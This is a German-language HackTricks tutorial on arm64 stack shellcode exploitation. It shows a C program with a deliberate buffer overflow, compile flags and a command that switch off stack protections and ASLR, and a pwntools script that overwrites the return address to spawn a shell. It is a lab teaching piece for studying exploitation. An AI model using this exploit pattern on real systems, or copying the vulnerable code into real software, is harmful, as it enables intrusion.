# Stack Shellcode - arm64

{{#include ../../../banners/hacktricks-training.md}}

Finden Sie eine Einführung in arm64 in:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Code
```c
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
Kompilieren ohne pie, canary und nx:
```bash
clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack
```
## Kein ASLR & Kein Canary - Stack Overflow

Um ASLR zu stoppen, führe aus:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Um die [**Offset des bof zu erhalten, überprüfen Sie diesen Link**](../ret2win/ret2win-arm64.md#finding-the-offset).

Exploits:
```python
from pwn import *

# Load the binary
binary_name = './bof'
elf = context.binary = ELF(binary_name)

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Start the process
p = process(binary_name)

# Offset to return address
offset = 72

# Address in the stack after the return address
ret_address = p64(0xfffffffff1a0)

# Craft the payload
payload = b'A' * offset + ret_address + shellcode

print("Payload length: "+ str(len(payload)))

# Send the payload
p.send(payload)

# Drop to an interactive session
p.interactive()
```
Die einzige "komplizierte" Sache, die hier zu finden wäre, wäre die Adresse im Stack, die aufgerufen werden soll. In meinem Fall habe ich den Exploit mit der Adresse generiert, die ich mit gdb gefunden habe, aber dann hat es beim Ausnutzen nicht funktioniert (weil sich die Stack-Adresse ein wenig geändert hat).

Ich öffnete die generierte **`core`-Datei** (`gdb ./bog ./core`) und überprüfte die tatsächliche Adresse des Starts des Shellcodes.

{{#include ../../../banners/hacktricks-training.md}}
